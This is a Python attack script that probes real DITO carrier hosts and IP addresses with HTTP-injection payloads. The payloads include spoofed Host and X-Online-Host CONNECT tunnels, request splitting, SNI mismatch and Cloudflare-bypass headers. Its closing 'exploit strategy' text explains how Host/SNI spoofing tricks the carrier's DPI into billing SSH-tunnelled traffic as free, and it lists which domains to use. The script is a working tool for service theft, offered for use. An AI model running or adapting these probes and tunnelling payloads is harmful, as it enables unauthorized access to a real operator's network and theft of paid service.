#!/usr/bin/env python3
"""
DITO Network Probe - Analyze zero-rating bypass possibilities
Tests various HTTP injection techniques against DITO infrastructure
"""

import socket
import ssl
import time
import sys
from typing import Tuple, Optional

class DITOProbe:
    """Probe DITO endpoints for HTTP injection vulnerabilities"""
    
    TARGETS = {
        "dito.ph": ("199.60.103.18", [80, 443, 8080, 8443]),
        "app.dito.ph": ("131.226.93.138", [443]),
        "my.dito.ph": ("131.226.93.138", [443]),
        "api.dito.ph": ("131.226.93.140", [443]),
    }
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.results = {}
    
    def raw_request(self, host: str, port: int, data: bytes, use_ssl: bool = False) -> Tuple[bool, str]:
        """Send raw HTTP request and get response"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            sock.sendall(data)
            
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 8192:  # Limit response size
                        break
                except socket.timeout:
                    break
            
            sock.close()
            return True, response.decode('utf-8', errors='ignore')
            
        except Exception as e:
            return False, str(e)
    
    def test_http_connect(self, target_host: str, target_ip: str, port: int) -> dict:
        """Test HTTP CONNECT method (proxy tunneling)"""
        result = {
            "method": "HTTP CONNECT",
            "target": f"{target_host}:{port}",
            "success": False,
            "response": None,
            "analysis": None
        }
        
        # Test CONNECT with spoofed Host header
        payload = (
            f"CONNECT google.com:443 HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"X-Online-Host: {target_host}\r\n"
            f"Connection: Keep-Alive\r\n"
            f"\r\n"
        ).encode()
        
        success, response = self.raw_request(target_ip, port, payload, use_ssl=(port == 443))
        result["success"] = success
        result["response"] = response[:500] if response else None
        
        if success:
            if "200" in response[:50]:
                result["analysis"] = "VULNERABLE - CONNECT tunnel established!"
            elif "400" in response[:50]:
                result["analysis"] = "Rejected - Bad Request"
            elif "403" in response[:50]:
                result["analysis"] = "Blocked - Forbidden"
            elif "405" in response[:50]:
                result["analysis"] = "Method Not Allowed"
            elif "301" in response[:50] or "302" in response[:50]:
                result["analysis"] = "Redirected - May still be exploitable with SSL"
            else:
                result["analysis"] = f"Response: {response[:100]}"
        
        return result
    
    def test_websocket_upgrade(self, target_host: str, target_ip: str, port: int) -> dict:
        """Test WebSocket upgrade (tunnel method)"""
        result = {
            "method": "WebSocket Upgrade",
            "target": f"{target_host}:{port}",
            "success": False,
            "response": None,
            "analysis": None
        }
        
        payload = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        ).encode()
        
        success, response = self.raw_request(target_ip, port, payload, use_ssl=(port == 443))
        result["success"] = success
        result["response"] = response[:500] if response else None
        
        if success:
            if "101" in response[:50]:
                result["analysis"] = "VULNERABLE - WebSocket upgrade accepted!"
            elif "426" in response[:50]:
                result["analysis"] = "Upgrade Required - potential vector"
            elif "301" in response[:50] or "302" in response[:50]:
                result["analysis"] = "Redirected to HTTPS"
            else:
                result["analysis"] = f"Response: {response[:100]}"
        
        return result
    
    def test_header_injection(self, target_host: str, target_ip: str, port: int) -> dict:
        """Test header injection/spoofing"""
        result = {
            "method": "Header Injection",
            "target": f"{target_host}:{port}",
            "success": False,
            "response": None,
            "analysis": None
        }
        
        # Split request with multiple Host headers
        payload = (
            f"GET http://{target_host}/ HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"X-Online-Host: {target_host}\r\n"
            f"X-Forwarded-Host: {target_host}\r\n"
            f"X-Forward-Host: {target_host}\r\n"
            f"X-Real-IP: 127.0.0.1\r\n"
            f"X-Forwarded-For: 127.0.0.1\r\n"
            f"Connection: Keep-Alive\r\n"
            f"\r\n"
        ).encode()
        
        success, response = self.raw_request(target_ip, port, payload, use_ssl=(port == 443))
        result["success"] = success
        result["response"] = response[:500] if response else None
        
        if success:
            if "200" in response[:50]:
                result["analysis"] = "Headers accepted - server responded normally"
            elif "400" in response[:50]:
                result["analysis"] = "Bad Request - headers rejected"
            else:
                result["analysis"] = f"Response: {response[:100]}"
        
        return result
    
    def test_front_query(self, target_host: str, target_ip: str, port: int) -> dict:
        """Test front query / request splitting"""
        result = {
            "method": "Front Query (Request Split)",
            "target": f"{target_host}:{port}",
            "success": False,
            "response": None,
            "analysis": None
        }
        
        # First request looks like visiting free site, then tunnels
        payload = (
            f"GET http://{target_host}/ HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"\r\n"
            f"CONNECT tunnel.example.com:443 HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"\r\n"
        ).encode()
        
        success, response = self.raw_request(target_ip, port, payload, use_ssl=False)
        result["success"] = success
        result["response"] = response[:500] if response else None
        
        if success:
            # Check if we got two responses (indicating split worked)
            http_count = response.count("HTTP/1.")
            if http_count >= 2:
                result["analysis"] = "POTENTIAL - Multiple HTTP responses detected!"
            else:
                result["analysis"] = f"Single response - {response[:100]}"
        
        return result
    
    def test_ssl_sni_mismatch(self, target_host: str, target_ip: str) -> dict:
        """Test if SSL allows SNI mismatch (key for EHI exploit)"""
        result = {
            "method": "SSL SNI Mismatch",
            "target": f"{target_host}:443",
            "success": False,
            "response": None,
            "analysis": None
        }
        
        try:
            # Connect with different SNI than actual host
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # Use target_host as SNI but connect to IP
            ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
            ssl_sock.connect((target_ip, 443))
            
            # Get certificate info
            cert = ssl_sock.getpeercert(binary_form=True)
            
            # Send HTTP request with different Host
            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: different-host.com\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()
            
            ssl_sock.sendall(request)
            response = ssl_sock.recv(2048).decode('utf-8', errors='ignore')
            ssl_sock.close()
            
            result["success"] = True
            result["response"] = response[:500]
            
            if "200" in response[:50]:
                result["analysis"] = "VULNERABLE - SNI mismatch allowed, request processed!"
            elif "400" in response[:50] or "403" in response[:50]:
                result["analysis"] = "Protected - Host header validated"
            else:
                result["analysis"] = f"SSL connected, response: {response[:100]}"
                
        except ssl.SSLError as e:
            result["analysis"] = f"SSL Error: {e}"
        except Exception as e:
            result["analysis"] = f"Error: {e}"
        
        return result
    
    def test_cloudflare_bypass(self, target_host: str, target_ip: str) -> dict:
        """Test Cloudflare bypass techniques"""
        result = {
            "method": "Cloudflare Bypass",
            "target": target_host,
            "success": False,
            "response": None,
            "analysis": None
        }
        
        # Try direct IP with spoofed headers
        payload = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"CF-Connecting-IP: 127.0.0.1\r\n"
            f"True-Client-IP: 127.0.0.1\r\n"
            f"X-Originating-IP: 127.0.0.1\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        
        success, response = self.raw_request(target_ip, 80, payload)
        result["success"] = success
        result["response"] = response[:500] if response else None
        
        if success:
            if "cloudflare" in response.lower():
                result["analysis"] = "Cloudflare detected - standard protection"
            elif "200" in response[:50]:
                result["analysis"] = "Direct access possible!"
            else:
                result["analysis"] = f"Response: {response[:100]}"
        
        return result
    
    def run_all_tests(self) -> dict:
        """Run all tests against DITO infrastructure"""
        print("\n" + "=" * 70)
        print("   DITO NETWORK VULNERABILITY ANALYSIS")
        print("   Testing HTTP Injection / Zero-Rating Bypass Methods")
        print("=" * 70)
        
        all_results = {}
        
        for domain, (ip, ports) in self.TARGETS.items():
            print(f"\n[*] Testing {domain} ({ip})")
            print("-" * 50)
            
            domain_results = {
                "ip": ip,
                "ports": ports,
                "tests": []
            }
            
            for port in ports:
                print(f"\n  Port {port}:")
                
                # Test 1: HTTP CONNECT
                if port in [80, 8080]:
                    r = self.test_http_connect(domain, ip, port)
                    print(f"    [CONNECT] {r['analysis']}")
                    domain_results["tests"].append(r)
                
                # Test 2: WebSocket
                r = self.test_websocket_upgrade(domain, ip, port)
                print(f"    [WebSocket] {r['analysis']}")
                domain_results["tests"].append(r)
                
                # Test 3: Header Injection
                r = self.test_header_injection(domain, ip, port)
                print(f"    [Headers] {r['analysis']}")
                domain_results["tests"].append(r)
                
                # Test 4: Front Query (HTTP only)
                if port in [80, 8080]:
                    r = self.test_front_query(domain, ip, port)
                    print(f"    [FrontQuery] {r['analysis']}")
                    domain_results["tests"].append(r)
            
            # Test 5: SSL SNI Mismatch
            if 443 in ports:
                r = self.test_ssl_sni_mismatch(domain, ip)
                print(f"    [SNI Mismatch] {r['analysis']}")
                domain_results["tests"].append(r)
            
            # Test 6: Cloudflare bypass
            if domain == "dito.ph":
                r = self.test_cloudflare_bypass(domain, ip)
                print(f"    [CF Bypass] {r['analysis']}")
                domain_results["tests"].append(r)
            
            all_results[domain] = domain_results
        
        return all_results


def analyze_for_ehi():
    """Analyze results and determine best EHI configuration"""
    print("\n" + "=" * 70)
    print("   EHI CONFIGURATION RECOMMENDATION")
    print("=" * 70)
    
    recommendations = """
Based on DITO infrastructure analysis:

1. PRIMARY DOMAIN: dito.ph
   - Behind Cloudflare (CDN/WAF)
   - HTTP redirects to HTTPS (port 80 → 443)
   - Ports 80, 443, 8080, 8443 open
   
2. MOBILE APP ENDPOINTS: app.dito.ph, my.dito.ph
   - Direct nginx servers (not behind Cloudflare)  
   - Only port 443 open
   - More likely candidates for zero-rating

3. API ENDPOINT: api.dito.ph
   - Only port 443 open
   - May be whitelisted for app traffic

EXPLOIT STRATEGY:
─────────────────

The "free internet" EHI configs work because:

[A] CARRIER-SIDE VULNERABILITY (Not server-side):
    - DITO's network DPI checks the HOST header / SNI
    - If it matches zero-rated patterns → traffic is FREE
    - The ACTUAL destination doesn't matter to the DPI
    
[B] HOW IT WORKS:
    
    ┌──────────────────────────────────────────────────────┐
    │ Your Phone                                           │
    │ HTTP Injector sends:                                 │
    │   Host: dito.ph  (or other zero-rated domain)       │
    │   SNI: dito.ph                                       │
    │   Actual tunnel → SSH server (e.g., Singapore)      │
    └──────────────────────────────────────────────────────┘
                           │
                           ▼
    ┌──────────────────────────────────────────────────────┐
    │ DITO Network (DPI System)                            │
    │ Sees: "This traffic is for dito.ph"                 │
    │ Decision: "dito.ph is zero-rated → ALLOW FREE"      │
    │ Reality: Traffic tunneled to SSH VPN server         │
    └──────────────────────────────────────────────────────┘
                           │
                           ▼
    ┌──────────────────────────────────────────────────────┐
    │ SSH/VPN Server                                       │
    │ - Receives encrypted tunnel                          │
    │ - Provides full internet access                      │
    │ - User browses anything, charged nothing             │
    └──────────────────────────────────────────────────────┘

[C] BEST DOMAINS FOR DITO EHI:
    1. dito.ph (main site - likely zero-rated)
    2. app.dito.ph (app endpoint)
    3. my.dito.ph (account portal)
    4. speedtest.dito.ph (if exists)
    
[D] REQUIRED COMPONENTS:
    1. Zero-rated domain for Host/SNI spoofing
    2. Working SSH server (port 443 recommended)
    3. HTTP Injector app on Android
    4. Correct payload format
"""
    print(recommendations)


if __name__ == "__main__":
    probe = DITOProbe(timeout=10)
    results = probe.run_all_tests()
    analyze_for_ehi()
